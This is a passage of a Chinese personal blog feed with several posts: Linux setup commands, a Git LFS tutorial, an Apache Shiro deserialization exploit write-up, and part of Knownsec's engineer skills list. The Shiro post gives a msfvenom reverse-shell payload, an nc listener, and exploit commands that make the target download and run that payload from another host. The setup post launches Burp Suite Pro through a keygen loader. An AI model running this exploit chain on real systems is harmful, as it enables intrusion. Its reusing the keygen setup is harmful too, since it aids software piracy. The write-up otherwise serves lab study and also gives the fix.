class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/java java /usr/java/jdk1.8.0_231/bin/java 300</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/javac javac /usr/java/jdk1.8.0_231/bin/javac 300</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --config java</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --config javac</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Name=BurpSuite_Pro</span><br><span class="line">Comment=Web Application proxy framework</span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Exec=java -noverify -Xbootclasspath/p:/usr/bin/burp-loader-keygen-2.jar -jar /usr/bin/burpsuite_pro_v2.1.jar</span><br><span class="line">Icon=parrot-burpsuite.png</span><br><span class="line">StartupNotify=false</span><br><span class="line">Terminal=false</span><br><span class="line">Type=Application</span><br><span class="line">Categories=03-06-web-application-proxies;top10</span><br><span class="line">X-Parrot-Package=burpsuite</span><br></pre></td></tr></table></figure><h2 id="docker-ce"><a href="#docker-ce" class="headerlink" title="docker-ce"></a>docker-ce</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &apos;deb https://download.docker.com/linux/debian stretch stable&apos; &gt; /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt remove docker docker-engine docker.io -y</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-ce -y</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/default/docker</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOCKER_OPTS=&quot;--registry-mirror=http://f1361db2.m.daocloud.io&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo groupdel docker</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd docker</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker $USER</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure><h2 id="google设置代理"><a href="#google设置代理" class="headerlink" title="google设置代理"></a>google设置代理</h2><p><code>`</code><br>google-chrome-stable –proxy-server=”<a href="http://127.0.0.1:7890&quot;" target="_blank" rel="noopener">http://127.0.0.1:7890&quot;</a> –no-sandbox</p>]]></content>
    
    <summary type="html">
    
      记录Macos\Linux常用配置命令及参数
    
    </summary>
    
    
      <category term="mac" scheme="http://yoursite.com/tags/mac/"/>
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Git使用技巧</title>
    <link href="http://yoursite.com/2020/03/29/Git%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <id>http://yoursite.com/2020/03/29/Git使用技巧/</id>
    <published>2020-03-29T14:19:09.000Z</published>
    <updated>2020-03-29T14:23:34.156Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Git使用技巧"><a href="#Git使用技巧" class="headerlink" title="Git使用技巧"></a>Git使用技巧</h1><h2 id="git如何上传大于100M文件"><a href="#git如何上传大于100M文件" class="headerlink" title="git如何上传大于100M文件"></a>git如何上传大于100M文件</h2><p><img src="/2020/03/29/Git使用技巧/a.png" alt="image|549x500"> </p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;# xxxxxxxxxxx &gt;&gt; README.md</span><br><span class="line">git init</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git remote add origin https://github.com/xxxxx/xxxxxxx.git</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p>这些基本操作就不用说了吧，下面进入关键步骤</p><hr><p>你想上传大于100MB你首先得装一个Git Large<br>鸟下就简单了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git-lfs</span><br></pre></td></tr></table></figure></p><p>Mac下怎么整？直接brew<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install git-lfs</span><br></pre></td></tr></table></figure></p><p>装完了，咋用？？？<br>cd到你仓库下，初始化 git lfs,很简单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//track文件类型，注意这里是track文件类型，不是track你要上传到文件看好，加入你想上传一个233.mp4，那你就track &quot;*.mp4&quot;</span><br><span class="line">git track &quot;*.mp4&quot; //以上边为例track一个文件类型为mp4</span><br><span class="line">git add .gitattributes //提交 .gitattributes 信息</span><br></pre></td></tr></table></figure></p><p>假如你想上传到不都是mp4，怎么办？你还想上传其他格式比如(pdf docx ppt )，继续track 你想上传的文件类型，然后commit信息，再举个例子，我想同时上传一个大于100MB的pdf和mp4<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git track &quot;*.mp4&quot; </span><br><span class="line">git add .gitattributes</span><br><span class="line">git track &quot;*.pdf&quot; </span><br><span class="line">git add .gitattributes</span><br></pre></td></tr></table></figure></p><p>简单的不能在简单了吧，，，，<br>然后就是上传文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git add 233.mp4</span><br><span class="line">git lfs ls-files //这个关注一下，你执行完命令你得看看这个大于100M文件是不是在lfs控制下如果输入完显示空白你得在仔细检查一下是不是哪有错误</span><br><span class="line">git commit -m &quot;2333&quot;</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure></p><p>最后补充一下如果你不小心track错了咋整？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git lfs untrack &quot;*.mp4&quot; //你可以用untrack取消跟踪</span><br></pre></td></tr></table></figure></p><p>成功上传大概这个样子<br><img src="/2020/03/29/Git使用技巧/b.png" alt="image|648x439"> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Git使用技巧&quot;&gt;&lt;a href=&quot;#Git使用技巧&quot; class=&quot;headerlink&quot; title=&quot;Git使用技巧&quot;&gt;&lt;/a&gt;Git使用技巧&lt;/h1&gt;&lt;h2 id=&quot;git如何上传大于100M文件&quot;&gt;&lt;a href=&quot;#git如何上传大于100M文件&quot; c
      
    
    </summary>
    
    
      <category term="github" scheme="http://yoursite.com/tags/github/"/>
    
  </entry>
  
  <entry>
    <title>Apache Shiro Java 反序列化漏洞分析及利用</title>
    <link href="http://yoursite.com/2020/03/29/Apache-Shiro-Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/03/29/Apache-Shiro-Java-反序列化漏洞分析及利用/</id>
    <published>2020-03-29T13:47:57.000Z</published>
    <updated>2020-03-29T13:49:03.922Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache-Shiro-Java-反序列化漏洞分析及利用"><a href="#Apache-Shiro-Java-反序列化漏洞分析及利用" class="headerlink" title="Apache Shiro Java 反序列化漏洞分析及利用"></a>Apache Shiro Java 反序列化漏洞分析及利用</h1><h1 id="0x00-项目地址"><a href="#0x00-项目地址" class="headerlink" title="0x00 项目地址"></a>0x00 项目地址</h1><p><a href="https://github.com/HexChristmas/Shiro_exploit" target="_blank" rel="noopener">https://github.com/HexChristmas/Shiro_exploit</a></p><h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>  这两天被派去护网&amp;重保，态势感知报了一条冰蝎的远程代码执行的告警，在通过告警日志以及webshell及相关信息，红队大概是通过shiro反序列化拿到主机权限，之前一大佬还特别分享过shiro反序列化漏洞，还没来及研究就碰上了正好这个机会研究分析一波，<br>shiro用remembreme这个cookie对用户进行鉴权，防止出现越权问题，它使用CookieRemembreMeManager这个类，对这个remebreme这个cookie进行序列化，然后对这个字符流进行aes加密，在对其进行base64编码，然后在返回客户端remebreme Cookie，这其实是有问题的，shiro把aes的密钥硬编码在代码里，我们可以通过调试代码发现aes加码的密钥进行解密，使用ysoserial包进行反序列化的CommonsCollections2这个方法发现密钥进行解密，生成并返回带有远程代码执行的remebreme Cookie进而反弹shell</p><h1 id="0x02-漏洞环境"><a href="#0x02-漏洞环境" class="headerlink" title="0x02 漏洞环境"></a>0x02 漏洞环境</h1><h3 id="方法一：Docker环境搭建"><a href="#方法一：Docker环境搭建" class="headerlink" title="方法一：Docker环境搭建"></a>方法一：Docker环境搭建</h3><p>这里可以直接pull大佬们做好的docker的漏洞环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure></p><p>将docker漏洞环境的8080端口映射到本机的80端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:8080 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure></p><h3 id="方法二：Linux虚拟机或者VPS搭建tomcat及shiro环境"><a href="#方法二：Linux虚拟机或者VPS搭建tomcat及shiro环境" class="headerlink" title="方法二：Linux虚拟机或者VPS搭建tomcat及shiro环境"></a>方法二：Linux虚拟机或者VPS搭建tomcat及shiro环境</h3><p>java环境啥的鸟都带了<br>直接去tomcat官网去下载二进制包，不用百度了，这里直接给你百度完了，<a href="http://mirror.bit.edu.cn/apache/tomcat/tomcat-8/v8.5.43/bin/apache-tomcat-8.5.43.tar.gz" target="_blank" rel="noopener">点击我进行跳转，Run！</a><br>或者你直接可以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget http://mirror.bit.edu.cn/apache/tomcat/tomcat-8/v8.5.43/bin/apache-tomcat-8.5.43.tar.gz /usr/share</span><br></pre></td></tr></table></figure></p><p>然后直接解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar zxvf apache-tomcat-8.5.43..tar.gz</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/apache-tomcat-8.5.43/bin/startup.sh</span><br></pre></td></tr></table></figure><p>我们现在只需把shiro包放到webapps下即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp shiro.war /usr/share/apache-tomcat-8.5.43/webapps</span><br></pre></td></tr></table></figure></p><p> 然后访问<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost:8080/Shiro</span><br></pre></td></tr></table></figure></p><p> <img src="https://raw.githubusercontent.com/HexChristmas/Shiro_exploit/master/img/3.png" alt="shiro"></p><p> 能看到这个就说明你已经启动成功了</p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h1><p>用msfvenom生成payload用于反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT=2333 elf &gt;  payload</span><br></pre></td></tr></table></figure></p><p><img src="https://raw.githubusercontent.com/HexChristmas/Shiro_exploit/master/img/1.png" alt="msfvenom"></p><p>nc监听2333端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure></p><p>使用shiro的脚本进行远程代码执行漏洞利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py &quot;http://127.0.0.1:81&quot; &quot;wget -p /tmp/ http://172.18.24.35/payload&quot;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py &quot;http://127.0.0.1:81&quot; &quot;chmod +x /tmp/payload&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py &quot;http://127.0.0.1:81&quot; &quot;/tmp/payload&quot;</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/HexChristmas/Shiro_exploit/master/img/2.png" alt="exploit"></p><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h1><p>升级 Shiro 版本至 1.2.5 以上</p><h1 id="0x4-参考文档"><a href="#0x4-参考文档" class="headerlink" title="0x4 参考文档"></a>0x4 参考文档</h1><p><a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">https://issues.apache.org/jira/browse/SHIRO-550</a></p><p><a href="https://www.seebug.org/vuldb/ssvid-92180" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92180</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Apache-Shiro-Java-反序列化漏洞分析及利用&quot;&gt;&lt;a href=&quot;#Apache-Shiro-Java-反序列化漏洞分析及利用&quot; class=&quot;headerlink&quot; title=&quot;Apache Shiro Java 反序列化漏洞分析及利用&quot;&gt;&lt;/a
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>知道创宇研发技能表</title>
    <link href="http://yoursite.com/2020/03/29/%E7%9F%A5%E9%81%93%E5%88%9B%E5%AE%87%E7%A0%94%E5%8F%91%E6%8A%80%E8%83%BD%E8%A1%A8/"/>
    <id>http://yoursite.com/2020/03/29/知道创宇研发技能表/</id>
    <published>2020-03-29T13:27:15.000Z</published>
    <updated>2020-03-29T13:28:14.793Z</updated>
    
    <content type="html"><![CDATA[<p>知道创宇研发技能表</p><ul><li><p>说明</p><ul><li><p>关于知道创宇</p><ul><li><p>知行合一 | 守正出奇</p></li><li><p>知道创宇是一家黑客文化浓厚的安全公司，愿景是让互联网更好更安全</p></li></ul></li><li>本技能表为知道创宇研发工程师的技能树集合，是的，很庞大<ul><li>聪明的人，会根据每个tip自驱动扩展</li><li>不聪明的人，坐等别人手把手，不仅不适合知道创宇，也不适合任何有极客精神的公司</li></ul></li><li>附件标志是我们推荐的附加资源，感谢资源提供者</li></ul></li><li>通用技能<ul><li>公司与个人<ul><li>公司是盈利性组织</li><li>个人和公司必须双赢</li><li>在认同公司理念且能够给公司创造足够价值的基础上，为个人发展而工作</li></ul></li><li>WHO AM I<ul><li>黑客是守正出奇且具备创造力的群体<ul><li>守正出奇<ul><li>这条正道/底线得坚守</li><li>但如果太过正就迂腐了，为了搞定任务有时得出奇招</li></ul></li><li>创造力<ul><li>一个没有创造力的人是多么的可怜，对于团队来说也是一种耻辱</li><li>本技能表的本质目的只有一个：引导你拥有足够的创造力</li></ul></li></ul></li><li>黑客也可以是一种思维方式</li><li>我们需要对得起名片上的那个头衔：工程师、研究员</li><li>牛人姿态<ul><li>即使现在不是牛人，也得具备这样的姿态</li><li>没有一定扎实内功与远见的人很少有这样的姿态</li><li>拥有不将就的做事风格，迟早是牛人</li></ul></li></ul></li><li>如何做事<ul><li>方法论<ul><li>完成一件事有好几条途径，优秀的人的途径最短</li><li>任务拆分很容易得出做事的方法论</li><li>好的「方法论」会让你具备更强的「创造力」！<ul><li>时刻问自己：「是否具备创造力？」</li></ul></li></ul></li><li>任务拆分<ul><li>成长过程会经历：能力越大、责任越大、事情越多</li><li>思路<ul><li>拆分细化为多个点</li><li>排好优先级<ul><li>任务四象限，决定优先级<ul><li>紧急重要<ul><li>赶紧搞定</li></ul></li><li>重要不紧急<ul><li>时刻保持关注，以免沦为「紧急重要」</li></ul></li><li>紧急不重要<ul><li>少少益善，学会拒绝</li></ul></li><li>不紧急不重要<ul><li>靠自律</li></ul></li></ul></li></ul></li><li>SMART原则<ul><li>S：任务是否明确<ul><li>不明确的任务搞起来就是浪费生命</li></ul></li><li>M：任务是否可度量<ul><li>不可度量如何体现价值？</li></ul></li><li>A：任务是否可搞定<ul><li>搞不定就不应该接，接就得有魄力搞定</li></ul></li><li>R：任务的相关性如何<ul><li>决定了任务的价值，相关性越高越能体现价值，比如这个任务搞定了能让团队获得公司、客户等更大的认可</li></ul></li><li>T：任务的时间<ul><li>Timeline：任务时间轴，什么时间点需要搞定什么</li><li>Deadline：任务的最后期限，做评估时最好提前，因为总会有各种意外或拖延本性</li><li>Timeline上一些很关键的时间点我们可以称为里程碑，搞定每个里程碑应该庆祝下</li></ul></li></ul></li><li>自己欠缺什么，立马发现</li><li>是否需要寻求帮助，谁能帮你，自己单干？ </li><li>团队<ul><li>士气第一</li><li>当你有团队时，分配与调度好任务很关键<ul><li>做得好是真并发</li><li>做不好会死锁</li></ul></li></ul></li></ul></li></ul></li><li>沟通、反馈与责任<ul><li>一个无沟通能力的人，要么是天才，要么是不可爱的人，不过天才也就寥寥无几而已，你并不是</li><li>反馈要及时<ul><li>避免出问题不反馈，影响进度</li><li>方式<ul><li>正式的：邮件</li><li>临时的：微信等即时通信</li><li>着急的：给个电话</li></ul></li></ul></li><li>工作有大小，责任心无大小</li><li>周报的透明<ul><li>意义：大家互相了解工作与心得，有利于自己的判断与成长<ul><li>观察是一种多重要的技能</li><li>不是单纯的给领导汇报工作</li></ul></li><li>周报需体现本周工作总结、下周工作计划、心得/问题/建议（我们叫唧唧歪歪）</li><li>周报可以很好体现一个人的<ul><li>总结能力</li><li>计划能力</li><li>分享能力<ul><li>想象下：一个人从来没有心得/问题/建议的沉淀或反馈，这个人是一个相对封闭的人，在团队作战中很难达到默契</li><li>当然，这种分享能力远不仅仅是在周报这种形式里</li></ul></li></ul></li></ul></li></ul></li><li>团队意识<ul><li>很多人都说自己具备足够好的团队意识，但是有些人却并不是这样<ul><li>举个小例子：一个10人团队约定早上10点开会，而你迟到了10分钟，对于团队来说你浪费了整个团队100分钟（10人*10分钟）的生命。有些人无羞愧之心要么是意识不到这点，要么这个团队的风气就是这样…</li></ul></li><li>团队意识是建立在互相信任的基础上</li><li>Leader最关键，优秀的Leader一定会有个优秀团队<ul><li>兵熊熊一个</li><li>将熊熊一窝</li></ul></li><li>如何拥有个优秀的团队是一个复杂的话题</li></ul></li></ul></li><li>成长<ul><li>新事物的敏感性<ul><li>保持好奇心</li><li>不要局限在自己的圈子，适当跨界吸收灵感</li><li>订阅国内外优秀博客/资源，Inoreader/深蓝阅读不错</li><li>选择性参与一些必要的会议，听必要的主题，讨论必要的话题</li></ul></li><li>关于知识<ul><li>对知识的渴望程度决定了前进动力的大小</li><li>当知识很廉价地摆在你面前，你反而不会珍惜</li><li>对知识保持敬畏之心</li></ul></li><li>不要让自己成为矫情/浮夸的人</li><li>和比你厉害的人在一起，和一流的人工作<ul><li>指点往往是精华</li><li>杜绝笨蛋爆炸<ul><li>二流的人招进来的人不太可能是一流的</li><li>久而久之一个团队就笨蛋爆炸了</li></ul></li></ul></li><li>思考<ul><li>批判性思考</li><li>换位思考<ul><li>对于一个团队来说，这点太关键</li></ul></li></ul></li><li>提问的智慧<ul><li>遇到问题先独立思考，尝试独立解决，尽最大努力后再提问</li><li>提问时，礼貌很关键（对知识的敬畏），清晰表达很关键</li><li>解决后，分享出来帮助更多需要帮助的人</li></ul></li><li>小事心态<ul><li>越基础的事越关键，越需要细心</li><li>不要一味盲目追求「高级感」，而忽视「小事」/「简单事」/「基础事」</li><li>基础不牢、地动山摇</li><li>小事做不好，别提大事</li></ul></li><li>无论是个人还是团队的成长都需要不断沉淀知识，没有沉淀根基不稳</li></ul></li><li>完成的定义<ul><li>比如写个PoC<ul><li><ol><li>搞懂了目标Web应用漏洞的原理</li></ol></li><li><ol start="2"><li>熟练运用Python各相关模块与机制</li></ol></li><li><ol start="3"><li>熟练了解了HTTP协议<ul><li>HTTP请求</li><li>HTTP响应</li></ul></li></ol></li><li><ol start="4"><li>代码写得够规范，让人看起来就是爽</li></ol></li><li><ol start="5"><li>程序经过足够的测试<ul><li>黑测试</li><li>白测试</li></ul></li></ol></li><li><ol start="6"><li>及时反馈进度<ul><li>我遇到困难了</li><li>我搞定了</li></ul></li></ol></li><li><ol start="7"><li>更新相关文档，沉淀</li></ol></li></ul></li></ul></li><li>熟练的定义<ul><li>比如熟练SQL注入<ul><li>SQL语句这门“语言”能脱离文档顺手写出</li><li>主流数据库的SQL特有函数、存储过程、机制我都了如指掌<ul><li>MySQL</li><li>MSSQL</li><li>Oracle</li><li>PostgreSQL</li><li>Access</li><li>SQLite</li><li>…</li></ul></li><li>牛逼的工具我不仅用的顺其自然，源码还读过几遍，我能修改<ul><li>sqlmap</li><li>…</li></ul></li><li>我具备创造性，而不仅仅是跟在大牛身后<ul><li>研究出了几个不错的技巧</li><li>发了几篇不错的Paper</li><li>对外会议/沙龙等进行了几次分享</li><li>写出了自己的相关工具，爽</li></ul></li><li>我实战了N回，遇到了很多奇葩环境，我有足够的信心绕过</li><li>以上这些之后，这才叫熟练！其他同理</li></ul></li></ul></li><li>好书推荐<ul><li>推荐理由<ul><li>打通任督二脉的书，怎能不看？<ul><li>但，尽信书不如无书</li></ul></li><li>任何科学研究最终必须至少到哲学层面，触碰到上帝的脚</li><li>具体技术类书籍请见「专业技能」相关部分</li></ul></li><li>鸡汤类<ul><li>黑客与画家<ul><li>印象深刻：设计者的品味<ul><li>好设计是简单的设计<ul><li>抓住本质</li></ul></li><li>好设计是永不过时的设计<ul><li>如果解决方法是丑陋的，那就肯定还有更好的解决方法，只是还没有发现而已</li></ul></li><li>好设计是解决主要问题的设计</li><li>好设计是启发性的设计</li><li>好设计通常是有点趣味性的设计</li><li>好设计是艰苦的设计</li><li>好设计是看似容易的设计</li><li>好设计是对称的设计</li><li>好设计是模仿大自然的设计</li><li>好设计是一种再设计</li><li>好设计是能够复制的设计</li><li>好设计往往是奇特的设计</li><li>好设计是成批出现的</li><li>好设计常常是大胆的设计</li></ul></li></ul></li><li>浪潮之巅<ul><li>感受IT帝国的崛起与没落，我们现在站在又一个互联网浪潮之巅</li></ul></li></ul></li><li>洁癖类<ul><li>重构</li><li>代码整洁之道</li><li>代码大全2</li></ul></li><li>敏捷类<ul><li>Rework中文版<ul><li>37signals团队的敏捷经验</li></ul></li><li>高效程序员的45个习惯</li></ul></li><li>产品类<ul><li>人人都是产品经理</li><li>结网</li></ul></li><li>神书<ul><li>自私的基因</li><li>失控</li></ul></li><li>…</li></ul></li></ul></li><li><p>专业技能</p><ul><li>原则<ul><li>至少完整看完与练习好一本书</li><li>至少过一遍官方文档</li></ul></li><li>基础必备<ul><li>HTTP抓包与调试<ul><li>Firefox插件<ul><li>Firebug<ul><li>抓包与各种调试</li></ul></li><li>Tamper Data<ul><li>拦截修改</li></ul></li><li>Live Http Header<ul><li>重放功能</li></ul></li><li>Hackbar<ul><li>编码解码/POST提交</li></ul></li><li>Modify Headers<ul><li>修改头部</li></ul></li></ul></li><li>Fiddler<ul><li>浏览器代理神器</li><li>拦截请求或响应</li><li>抓包</li><li>重放</li><li>模拟请求</li><li>编码解码</li><li>第三方扩展<ul><li>Watcher<ul><li>Web前端安全的自动审计工具</li></ul></li></ul></li></ul></li><li>Wireshark<ul><li>各种强大的过滤器语法</li></ul></li><li>Tcpdump<ul><li>命令行的类Wireshark抓包神器</li></ul></li><li>Python<ul><li>urllib2<ul><li>打开请求响应调试<ul><li>编辑urllib2的do_open里的h.set_debuglevel</li><li>改为h.set_debuglevel(1)，这时可以清晰看到请求响应数据，包括https</li></ul></li></ul></li></ul></li></ul></li><li>什么是跳转<ul><li>服务端跳转<ul><li>302<ul><li>&lt;?php header(“Location: 3.php”); ?&gt;</li></ul></li><li>301<ul><li>&lt;?php header(“HTTP/1.1 301 Moved Permanently”); header(“Location: 2.php”); ?&gt;</li></ul></li><li>u=urllib2.urlopen(url)后，u.url能得到服务端跳转后的地址<ul><li>urllib2自己的特性</li><li>所谓的会跟进去</li></ul></li></ul></li><li>客户端跳转<ul><li><meta http-equiv="refresh" content="0; url=http://www.evilcos.me"><ul><li>htmlparse解析就行了</li></ul></li><li>location.href=”http:/“ + “/evilcos.me”;<ul><li>正则解析（弱）</li><li>JavaScript引擎解析（强）</li></ul></li></ul></li></ul></li><li>Office能力<ul><li>Word文档编写，看去要专业，尤其对外的</li><li>Excel里面大量的统计、图表功能，需要善于使用</li><li>PPT演讲、培训等必备，如何做好PPT？百度一下…</li><li>进一步<ul><li>yEd</li><li>Visio</li><li>FreeMind<ul><li>本技能表就是这个制作</li></ul></li></ul></li></ul></li><li>上手Linux<ul><li>《鸟哥的Linux私房菜》</li></ul></li><li>熟练VIM<ul><li>实战至少3回合：<a href="http://coolshell.cn/articles/5426.html" target="_blank" rel="noopener">http://coolshell.cn/articles/5426.html</a> </li></ul></li><li>上手Python<ul><li><a href="https://www.python.org/dev/peps/pep-0008/" target="_blank" rel="noopener">https://www.python.org/dev/peps/pep-0008/</a> </li><li><a href="http://learnpythonthehardway.org/book/" target="_blank" rel="noopener">http://learnpythonthehardway.org/book/</a> </li><li>《Python核心编程2》<ul><li>第4章 Python对象<ul><li>完整熟练</li></ul></li><li>6.8 Unicode<ul><li>完整熟练</li></ul></li><li>8.11 迭代器和iter()函数<ul><li>完整熟练</li></ul></li><li>第9章 文件的输入和输出<ul><li>完整熟练</li></ul></li><li>第10章 错误和异常<ul><li>完整熟练</li></ul></li><li>第11章 函数和函数式编程<ul><li>完整熟练</li></ul></li><li>第12章 模块<ul><li>完整熟练</li></ul></li><li>第14章 执行环境<ul><li>完整熟练</li></ul></li><li>第15章 正则表达式<ul><li>完整熟练</li></ul></li><li>第18章 多线程编程<ul><li>完整熟练</li></ul></li><li>20.2 使用Python进行Web应用：创建一个简单的Web客户端<ul><li>完整熟练</li></ul></li></ul></li></ul></li><li>算法<ul><li>快排</li><li>二分</li></ul></li><li>正则表达式<ul><li>调试工具<ul><li>Kodos</li><li>RegexBuddy<ul><li>支持多种语言</li><li>支持调试优化</li></ul></li><li><a href="http://www.regexper.com/" target="_blank" rel="noopener">http://www.regexper.com/</a> <ul><li>正则图解</li></ul></li></ul></li><li>正则表达式30分钟入门教程：<a href="http://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="noopener">http://deerchao.net/tutorials/regex/regex.htm</a> </li><li><a href="http://wiki.ubuntu.org.cn/Python正则表达式操作指南" target="_blank" rel="noopener">http://wiki.ubuntu.org.cn/Python正则表达式操作指南</a> 